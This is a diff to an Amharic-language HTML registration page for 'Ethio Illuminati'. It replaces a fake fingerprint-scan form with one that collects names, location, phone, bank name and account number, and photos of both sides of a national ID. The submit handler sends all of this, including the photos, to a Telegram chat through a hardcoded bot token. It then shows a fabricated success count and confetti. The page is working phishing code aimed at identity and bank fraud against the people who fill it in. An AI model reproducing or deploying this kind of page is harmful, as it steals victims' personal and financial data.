@@ -2,308 +2,319 @@
 <html lang="am">
 <head>
   <meta charset="UTF-8" />
+  <title>የኢትዮ ኢሉሚኔት መመዝገቢያ</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>የኢሉምናቲ አማኞች የምዝገባ ቅፅ 0997235723</title>
   <style>
     body {
-      background-color: black;
-      color: lime;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      margin: 20px;
-    }
-    header {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    header img {
-      width: 80px;
-      border-radius: 8px;
-      margin: 5px;
-    }
-    form {
-      border: 2px solid lime;
-      border-radius: 15px;
+      background: #f0fdf4;
+      margin: 0;
       padding: 20px;
-      max-width: 480px;
-      margin: auto;
-      background: #111;
+      color: #1b4332;
+      min-height: 100vh;
     }
+
+    .flags {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    .flags span {
+      font-size: 60px;
+      margin: 0 12px;
+    }
+
+    h2 {
+      text-align: center;
+      font-size: 28px;
+      color: #14532d;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+
+    .intro {
+      text-align: center;
+      font-size: 18px;
+      color: #22543d;
+      background: #d1fae5;
+      border-left: 6px solid #16a34a;
+      border-radius: 10px;
+      padding: 18px 24px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+      margin-bottom: 30px;
+      font-weight: 500;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    form {
+      max-width: 520px;
+      margin: 0 auto 30px auto;
+      background: white;
+      padding: 30px 40px;
+      border-radius: 14px;
+      box-shadow: 0 6px 18px rgba(22, 101, 52, 0.08);
+      border: 1px solid #cbd5cb;
+    }
+
     label {
       display: block;
-      margin-top: 15px;
-      font-weight: bold;
+      margin-top: 20px;
+      font-weight: 600;
+      color: #1b4332;
+      font-size: 15px;
+      letter-spacing: 0.02em;
     }
+
     input, select {
       width: 100%;
-      padding: 8px;
-      margin-top: 5px;
+      padding: 12px 14px;
+      margin-top: 8px;
+      border: 1.5px solid #a7f3d0;
       border-radius: 8px;
-      border: 1px solid lime;
-      background: black;
-      color: lime;
-      font-size: 1em;
+      font-size: 16px;
+      color: #064e3b;
+      transition: border-color 0.3s ease;
+      box-sizing: border-box;
     }
+
+    input:focus, select:focus {
+      outline: none;
+      border-color: #16a34a;
+      box-shadow: 0 0 8px rgba(22, 163, 74, 0.3);
+    }
+
     button {
-      cursor: pointer;
-      margin-top: 10px;
-      padding: 10px;
+      margin-top: 30px;
       width: 100%;
-      font-size: 1em;
-      border-radius: 12px;
+      padding: 14px;
+      background-color: #15803d;
+      color: white;
       border: none;
-      font-weight: bold;
-      transition: background-color 0.3s ease, color 0.3s ease;
-    }
-    button[type="submit"] {
-      background: lime;
-      color: black;
-    }
-    button[type="submit"]:hover {
-      background: #a0d400;
-    }
-    .fingerprint-scan {
-      margin-top: 20px;
-    }
-    .finger-slot {
-      text-align: center;
-      margin-bottom: 10px;
-    }
-    .finger-shape {
-      position: relative;
-      width: 100px;
-      height: 160px;
-      margin: auto;
-      background: #111;
-      border-radius: 60px 60px 30px 30px;
-      border: 3px solid lime;
-      overflow: hidden;
-      box-shadow: 0 0 10px lime;
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: 700;
       cursor: pointer;
-      user-select: none;
+      box-shadow: 0 4px 10px rgba(22, 163, 74, 0.4);
+      transition: background-color 0.3s ease;
     }
-    .scan-line {
-      position: absolute;
-      top: -100%;
-      left: 0;
-      width: 100%;
-      height: 30px;
-      background: rgba(0, 255, 0, 0.2);
-      box-shadow: 0 0 10px 5px lime;
-      animation: scanMove 3s linear forwards;
-      z-index: 2;
+
+    button:hover {
+      background-color: #16a34a;
+      box-shadow: 0 6px 14px rgba(22, 163, 74, 0.5);
     }
-    .checkmark {
-      position: absolute;
+
+    .success-message {
+      max-width: 520px;
+      margin: 20px auto;
+      padding: 25px 30px;
+      background: #d1fae5;
+      border: 2px solid #22c55e;
+      border-radius: 14px;
+      color: #14532d;
+      font-weight: 700;
+      font-size: 20px;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(34, 197, 94, 0.4);
       display: none;
-      font-size: 5em;
-      color: lime;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      animation: popIn 0.5s ease-in-out;
-      z-index: 3;
-      pointer-events: none;
-      user-select: none;
-    }
-    @keyframes scanMove {
-      0% { top: -30px; }
-      100% { top: 160px; }
-    }
-    @keyframes popIn {
-      0% { transform: translate(-50%, -50%) scale(0); opacity: 0; }
-      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-    }
-    .hand-section {
-      margin-top: 15px;
-    }
-    .hand-section h3 {
-      text-align: center;
-      margin-bottom: 10px;
-      color: lime;
-      font-weight: 700;
-    }
-    .hand-grid {
-      display: flex;
-      justify-content: space-around;
-      flex-wrap: wrap;
-      gap: 10px;
+      animation: fadeIn 1.2s ease-in-out forwards;
     }
 
-    /* Start Page styles */
-    #startPage {
-      text-align: center; 
-      margin-top: 50px; 
-      background: url('https://images.unsplash.com/photo-1603791440384-56cd371ee9a7?auto=format&fit=crop&w=800&q=80') no-repeat center center; 
-      background-size: cover; 
-      color: lime; 
-      padding: 60px 20px; 
-      border-radius: 15px;
-      position: relative;
-      box-shadow: inset 0 0 0 2000px rgba(0,0,0,0.5);
-      transition: opacity 0.5s ease;
-      font-weight: 500;
-    }
-    #startPage h1 {
-      font-weight: 700;
-      font-size: 2.5em;
-      text-shadow: 2px 2px 6px black;
-      margin-bottom: 0.2em;
-    }
-    #startPage p.lead {
-      font-weight: 500;
-      font-size: 1.2em;
-      text-shadow: 1px 1px 3px black;
-      margin-bottom: 1.5em;
-    }
-    #startPage p.contact {
-      margin-top: 25px; 
-      font-weight: 600; 
-      font-size: 1em; 
-      line-height: 1.5; 
-      text-shadow: 1px 1px 2px black;
-    }
-    #startPage p.contact a {
-      color: lime; 
-      text-decoration: underline; 
-      font-weight: 700; 
-      display: inline-flex; 
-      align-items: center; 
-      justify-content: center; 
-      gap: 6px;
-    }
-    #startPage p.contact img {
-      height: 22px;
-    }
-    #startPage button.start-btn {
-      padding: 15px 40px; 
-      font-size: 1.3em; 
-      border: none; 
-      background: lime; 
-      color: black; 
-      border-radius: 14px; 
-      cursor: pointer;
-      box-shadow: 0 0 12px lime;
-      margin-top: 40px;
-      font-weight: 700;
-      transition: background-color 0.3s ease, color 0.3s ease;
-    }
-    #startPage button.start-btn:hover {
-      background-color: #a0d400;
-      color: black;
+    #idPreview img,
+    #selfiePreview img {
+      max-width: 100%;
+      margin-top: 12px;
+      border-radius: 10px;
+      box-shadow: 0 3px 8px rgba(0,0,0,0.12);
     }
 
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: scale(0.9);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
   </style>
 </head>
 <body>
 
-<!-- Start Page -->
-<div id="startPage" role="main" aria-label="Welcome Page">
-  <h1>እንኳን ደህና መጡ</h1>
-  <p class="lead">ወደ የኢሉምናቲ አማኞች የመመዝገቢያ ስርዓት</p>
-  
-  <p class="contact">
-    ስልክ ቁጥር: <span aria-label="Phone Number" role="text">0997235723</span><br/>
-    <a href="https://t.me/Ethio_illumnate_666" target="_blank" rel="noopener" aria-label="Telegram Channel @Ethio_illumnate_666">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" />
-      @Ethio_illumnate_666
-    </a>
-  </p>
-  
-  <button class="start-btn" onclick="startForm()" aria-label="Start Registration Form">ጀምር</button>
-</div>
-
-<!-- Main Content -->
-<div id="mainContent" style="display:none;">
-
-<header>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/7/71/Flag_of_Ethiopia.svg" alt="Ethiopian Flag" />
-  <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" alt="American Flag" />
-  <h1>የኢሉምናቲ አማኞች የምዝገባ ቅፅ 0997235723</h1>
-
-  <p style="font-weight: bold; color: lime;">
-    <a href="https://t.me/Ethio_illumnate_666" target="_blank" rel="noopener" style="color: lime; text-decoration: underline; font-weight: bold;">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" style="height: 20px; vertical-align: middle; margin-right: 5px;" />
-      @Ethio_illumnate_666
-    </a>
-  </p>
-</header>
-
-<form id="illuminateForm">
-  <label for="name">ስም (Full Name)</label>
-  <input id="name" name="name" type="text" required />
-
-  <label for="sex">ፆታ (Sex)</label>
-  <select id="sex" name="sex" required>
-    <option value="" disabled selected>ምረጥ</option>
-    <option value="male">ወንድ</option>
-    <option value="female">ሴት</option>
-  </select>
-
-  <label for="age">እድሜ (Age)</label>
-  <input id="age" name="age" type="number" min="1" max="120" required />
-
-  <label for="phone">ስልክ ቁጥር (Phone Number)</label>
-  <input id="phone" name="phone" type="tel" pattern="[0-9]{10}" required />
-
-  <div class="fingerprint-scan">
-    <label>ፊተኛ እንቅስቃሴ (10-Finger Scan)</label>
-
-    <div class="hand-section">
-      <h3>ቀኝ እጅ</h3>
-      <div class="hand-grid">
-        <div class="finger-slot"><div class="finger-shape" id="finger1" onclick="scanFinger(1)"><span class="checkmark">&#10004;</span></div><div>አውራ ጣት</div></div>
-        <div class="finger-slot"><div class="finger-shape" id="finger2" onclick="scanFinger(2)"><span class="checkmark">&#10004;</span></div><div>ጠቋሚ ጣት</div></div>
-        <div class="finger-slot"><div class="finger-shape" id="finger3" onclick="scanFinger(3)"><span class="checkmark">&#10004;</span></div><div>መሀል ጣት</div></div>
-        <div class="finger-slot"><div class="finger-shape" id="finger4" onclick="scanFinger(4)"><span class="checkmark">&#10004;</span></div><div>ቀለበት ጣት</div></div>
-        <div class="finger-slot"><div class="finger-shape" id="finger5" onclick="scanFinger(5)"><span class="checkmark">&#10004;</span></div><div>ጩላ ጣት</div></div>
-      </div>
-    </div>
-
-    <div class="hand-section">
-      <h3>ግራ እጅ</h3>
-      <div class="hand-grid">
-        <div class="finger-slot"><div class="finger-shape" id="finger6" onclick="scanFinger(6)"><span class="checkmark">&#10004;</span></div><div>አውራ ጣት</div></div>
-        <div class="finger-slot"><div class="finger-shape" id="finger7" onclick="scanFinger(7)"><span class="checkmark">&#10004;</span></div><div>ጠቋሚ ጣት</div></div>
-        <div class="finger-slot"><div class="finger-shape" id="finger8" onclick="scanFinger(8)"><span class="checkmark">&#10004;</span></div><div>መሀል ጣት</div></div>
-        <div class="finger-slot"><div class="finger-shape" id="finger9" onclick="scanFinger(9)"><span class="checkmark">&#10004;</span></div><div>ቀለበት ጣት</div></div>
-        <div class="finger-slot"><div class="finger-shape" id="finger10" onclick="scanFinger(10)"><span class="checkmark">&#10004;</span></div><div>ጩላ ጣት</div></div>
-      </div>
-    </div>
+  <div class="flags">
+    <span>🇪🇹</span>
+    <span>🇺🇸</span>
   </div>
 
-  <button type="submit">አስገባ</button>
-</form>
+  <h2>የኢትዮ ኢሉሚኔት መመዝገቢያ</h2>
 
-</div> <!-- Close mainContent -->
+  <div class="intro" id="typedText"></div>
 
-<script>
-  function startForm() {
-    const startPage = document.getElementById('startPage');
-    startPage.style.opacity = 0;
-    setTimeout(() => {
-      startPage.style.display = 'none';
-      document.getElementById('mainContent').style.display = 'block';
-    }, 500);
-  }
+  <form id="regForm">
+    <label>ሙሉ ስም</label>
+    <input type="text" name="name" required />
 
-  function scanFinger(id) {
-    const finger = document.getElementById('finger' + id);
-    if (finger.querySelector('.scan-line')) return;
+    <label>የአባት ስም</label>
+    <input type="text" name="father_name" required />
 
-    const scanLine = document.createElement('div');
-    scanLine.classList.add('scan-line');
-    finger.appendChild(scanLine);
+    <label>ክልል</label>
+    <input type="text" name="region" required />
 
-    scanLine.addEventListener('animationend', () => {
-      scanLine.remove();
-      const check = finger.querySelector('.checkmark');
-      check.style.display = 'block';
+    <label>ዞን</label>
+    <input type="text" name="zone" required />
+
+    <label>ቀበሌ</label>
+    <input type="text" name="kebele" required />
+
+    <label>እድሜ</label>
+    <input type="number" name="age" required />
+
+    <label>ፆታ</label>
+    <select name="sex" required>
+
+      <option>ወንድ</option>
+      <option>ሴት</option>
+    </select>
+
+    <label>ስልክ ቁጥር</label>
+    <input type="tel" name="phone" required />
+
+    <label>የባንክ ስም</label>
+    <input type="text" name="bank_name" required />
+
+    <label>የባንክ ሂሳብ ቁጥር</label>
+    <input type="text" name="account_number" required />
+
+    <label>የመታወቂያ የፊት ፎቶ</label>
+    <input type="file" name="id_photo" accept="image/*" onchange="previewImage(this, 'idPreview')" required />
+    <div id="idPreview"></div>
+
+    <label>የመታወቂያ የኋላ ፎቶ</label>
+    <input type="file" name="selfie_photo" accept="image/*" onchange="previewImage(this, 'selfiePreview')" required />
+    <div id="selfiePreview"></div>
+
+    <button type="submit">አስገባ</button>
+  </form>
+
+  <div class="success-message" id="successMessage">
+    🎉 <span id="userName"></span> እንኳን ደስ አልዎት!<br /><br />
+    ✅ ምዝገባዎ በተሳካ ሁኔታ ተጠናቋል።<br />
+    🙌 እስካሁን ከ129,543 በላይ ሰዎች ተመዝግበዋል።<br />
+    💚 ከኢትዮ ኢሉምናቲ ጋር ብሩህ  ህይወት ይጀምሩ።
+  </div>
+
+  <canvas id="confettiCanvas" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9999;"></canvas>
+
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+  <script>
+    const botToken = '7875314076:AAEKL_ftYRUlAfK3O4lk5c4u60DFFZ3N-yo';
+    const chatId = '8155585808';
+
+    function previewImage(input, previewId) {
+      const previewDiv = document.getElementById(previewId);
+      previewDiv.innerHTML = '';
+      const file = input.files[0];
+      if (file) {
+        const reader = new FileReader();
+        reader.onload = function (e) {
+          const img = document.createElement('img');
+          img.src = e.target.result;
+          previewDiv.appendChild(img);
+        };
+        reader.readAsDataURL(file);
+      }
+    }
+
+    function typingEffect(elementId, text, speed = 50) {
+      let index = 0;
+      const element = document.getElementById(elementId);
+      function type() {
+        if (index < text.length) {
+          element.innerHTML += text.charAt(index);
+          index++;
+          setTimeout(type, speed);
+        }
+      }
+      type();
+    }
+
+    function triggerConfetti() {
+      const duration = 3 * 1000;
+      const animationEnd = Date.now() + duration;
+      const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 9999 };
+
+      const interval = setInterval(function () {
+        const timeLeft = animationEnd - Date.now();
+        if (timeLeft <= 0) return clearInterval(interval);
+
+        confetti({
+          ...defaults,
+          particleCount: 60,
+          origin: { x: Math.random(), y: Math.random() - 0.2 }
+        });
+      }, 250);
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      typingEffect(
+        "typedText",
+        "❻❻❻ እንኳን ወደ ኢትዮ ኢሉምናቲ በደህና መጡ! 💡 ብሩህ ነገ ለመገንባት የተሰማሩ ዜጎችን እንመዝግባለን። 🙏 እባክዎ መረጃዎን በትክክል ያስገቡ።"
+      );
     });
-  }
 
-  document.getElementById('illuminateForm').addEventListener('submit', e => {
-    e.preventDefault();
-    alert('ቅፅ ተሰጥቷል!');
-  });
-</script>
+    document.getElementById("regForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+      const form = e.target;
+      const data = new FormData(form);
 
+      const message = `
+*የመመዝገቢያ መረጃ*
+👤 ሙሉ ስም: ${data.get("name")}
+👨 የአባት ስም: ${data.get("father_name")}
+🎂 እድሜ: ${data.get("age")}
+🚻 ፆታ: ${data.get("sex")}
+📱 ስልክ: ${data.get("phone")}
+📍 ክልል: ${data.get("region")}
+📍 ዞን: ${data.get("zone")}
+📍 ቀበሌ: ${data.get("kebele")}
+🏦 ባንክ: ${data.get("bank_name")}
+💳 መለያ: ${data.get("account_number")}
+      `;
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown",
+        }),
+      });
+
+      const sendPhoto = async (photoFile, caption) => {
+        const photoData = new FormData();
+        photoData.append("chat_id", chatId);
+        photoData.append("photo", photoFile);
+        photoData.append("caption", caption);
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: photoData,
+        });
+      };
+
+      await sendPhoto(data.get("id_photo"), "🪪 የመታወቂያ ፎቶ");
+      await sendPhoto(data.get("selfie_photo"), "🤳 ራስን የወሰደ ፎቶ");
+
+      document.getElementById("userName").innerText = data.get("name");
+      document.getElementById("successMessage").style.display = "block";
+      triggerConfetti();
+
+      form.reset();
+      document.getElementById("idPreview").innerHTML = "";
+      document.getElementById("selfiePreview").innerHTML = "";
+    });
+  </script>
+</body>
+</html>
